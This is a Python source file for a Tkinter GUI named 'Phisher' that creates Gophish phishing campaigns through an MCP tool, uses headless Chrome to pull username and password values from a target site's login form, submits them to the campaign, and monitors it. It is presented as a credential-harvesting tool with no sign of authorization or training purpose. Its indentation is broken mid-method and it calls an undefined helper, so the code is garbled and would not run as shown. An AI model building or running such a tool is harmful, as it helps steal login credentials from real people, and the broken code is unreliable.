import os
import asyncio
import logging
import tkinter as tk
from tkinter import messagebox
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

def get_api_key_from_config():
    # Placeholder function to get API key from a configuration file
    return os.getenv('GOPHISH_API_KEY')

class Phisher:
    def __init__(self, master):
        self.master = master
        self.name_entry = None
        self.target_url_entry = None
        self.campaign_id_entry = None
        self.setup_ui()

    def setup_ui(self):
        self.name_label = tk.Label(self.master, text="Campaign Name:")
        self.name_label.pack()
        self.name_entry = tk.Entry(self.master)
        self.name_entry.pack()

        self.target_url_label = tk.Label(self.master, text="Target URL:")
        self.target_url_label.pack()
        self.target_url_entry = tk.Entry(self.master)
        self.target_url_entry.pack()

        self.campaign_id_label = tk.Label(self.master, text="Campaign ID:")
        self.campaign_id_label.pack()
        self.campaign_id_entry = tk.Entry(self.master)
        self.campaign_id_entry.pack()

        self.create_button = tk.Button(self.master, text="Create Campaign", command=self.create_campaign)
        self.create_button.pack()

        self.extract_button = tk.Button(self.master, text="Extract Credentials", command=self.extract_credentials)
        self.extract_button.pack()

        self.monitor_button = tk.Button(self.master, text="Monitor Campaign", command=self.monitor_campaign)
        self.monitor_button.pack()

    async def create_campaign(self):
        name = self.name_entry.get()
        target_url = self.target_url_entry.get()
        campaign_id = self.campaign_id_entry.get()
api_key = get_api_key_from_config()

if not api_key:
    messagebox.showerror("Error", "API Key is missing. Please check your configuration file.")
    return False

        try:
            result = await use_mcp_tool({
                "server_name": 'gophish',
                "tool_name": 'create_campaign',
                "arguments": {
                    "name": name,
                    "target_url": target_url,
                    "campaign_id": campaign_id,
                    "api_key": api_key
                }
            })
            messagebox.showinfo("Success", f"Gophish campaign created: {result.content[0].text}")
            return True
        except Exception as error:
            logging.basicConfig(filename='phisher.log', level=logging.ERROR)
            logging.error(f"Error creating Gophish campaign: {error}")
            messagebox.showerror("Error", f"Error creating Gophish campaign. Please check the log file for details.")
            return False

    async def extract_credentials(self):
        target_url = self.target_url_entry.get()
        campaign_id = self.campaign_id_entry.get()
        api_key = os.getenv('GOPHISH_API_KEY')

        if not api_key:
            messagebox.showerror("Error", "API Key is required to proceed.")
            return False

        chrome_options = Options()
        chrome_options.add_argument("--headless")
        driver = webdriver.Chrome(options=chrome_options)

        try:
            driver.get(target_url)
            wait = WebDriverWait(driver, 10)
            try:
form = wait.until(EC.presence_of_element_located((By.TAG_NAME, "form")))
username_field = form.find_element(By.NAME, "username") if form else None
password_field = form.find_element(By.NAME, "password") if form else None
submit_button = form.find_element(By.TAG_NAME, "button") if form else None

                username = username_field.get_attribute("value")
                password = password_field.get_attribute("value")

                if username and password:
                    result = await use_mcp_tool({
                        "server_name": 'gophish',
                        "tool_name": 'submit_credentials',
                        "arguments": {
                            "campaign_id": campaign_id,
                            "username": username,
                            "password": password,
                            "api_key": api_key
                        }
                    })
                    messagebox.showinfo("Success", f"Credentials submitted: {result.content[0].text}")
                    return True
                else:
                    messagebox.showerror("Error", "Could not extract credentials.")
                    return False
            except (TimeoutException, NoSuchElementException) as e:
                logging.error(f"Error extracting credentials: {e}")
                messagebox.showerror("Error", f"Error extracting credentials. Please check the log file for details.")
                return False
        finally:
            driver.quit()

    async def monitor_campaign(self):
        campaign_id = self.campaign_id_entry.get()
        api_key = os.getenv('GOPHISH_API_KEY')

        if not api_key:
            messagebox.showerror("Error", "API Key is required to proceed.")
            return False

        try:
            result = await use_mcp_tool({
                "server_name": 'gophish',
                "tool_name": 'monitor_campaign',
                "arguments": {
                    "campaign_id": campaign_id,
                    "api_key": api_key
                }
            })
            messagebox.showinfo("Campaign Monitoring", f"Current campaign status: {result.content[0].text}")
            return True
        except Exception as error:
            logging.error(f"Error monitoring campaign: {error}")
            messagebox.showerror("Error", f"Error monitoring campaign. Please check the log file for details.")
            return False
